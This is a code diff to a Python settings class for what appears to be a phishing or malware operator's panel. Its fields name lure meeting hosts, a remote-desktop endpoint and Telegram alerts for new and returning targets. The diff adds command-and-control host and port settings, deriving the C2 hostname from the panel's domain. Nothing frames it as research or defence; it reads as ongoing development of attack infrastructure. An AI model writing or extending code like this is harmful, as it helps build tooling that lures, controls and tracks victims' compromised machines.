@@ -65,6 +65,8 @@ class Settings:
     lure_meet_hosts: list[str]
     panel_bin_dir: str
     rd_endpoint: str
+    c2_host: str = ""
+    c2_port: int = 443
     tg_chat_health: str = ""
     tg_chat_new: str = ""
     tg_chat_returning: str = ""
@@ -124,6 +126,9 @@ class Settings:
 
                 pass_hash = bcrypt.hashpw(plaintext.encode(), bcrypt.gensalt(rounds=12)).decode()
 
+        public_host = get("PANEL_PUBLIC_HOST", "localhost") or "localhost"
+        zone = public_host.split(".", 1)[1] if "." in public_host else public_host
+
         return Settings(
             env_file=env_path,
             db_path=db_path,
@@ -141,7 +146,9 @@ class Settings:
             bridge_url=(get("PANEL_BRIDGE_URL", "http://127.0.0.1:8001") or "").rstrip("/"),
             rd_port=int(get("PANEL_RD_PORT", "8443") or "8443"),
             rd_bind=get("PANEL_RD_BIND", "127.0.0.1") or "127.0.0.1",
-            public_host=get("PANEL_PUBLIC_HOST", "localhost") or "localhost",
+            public_host=public_host,
+            c2_host=get("PANEL_C2_HOST", f"c2.{zone}") or f"c2.{zone}",
+            c2_port=int(get("PANEL_C2_PORT", "443") or "443"),
             tls_cert=get("PANEL_TLS_CERT", "/etc/caddy/certs/panel.crt") or "",
             tg_bot_token=get("TG_BOT_TOKEN", "") or "",
             tg_chat_id=get("TG_CHAT_ID", "") or "",
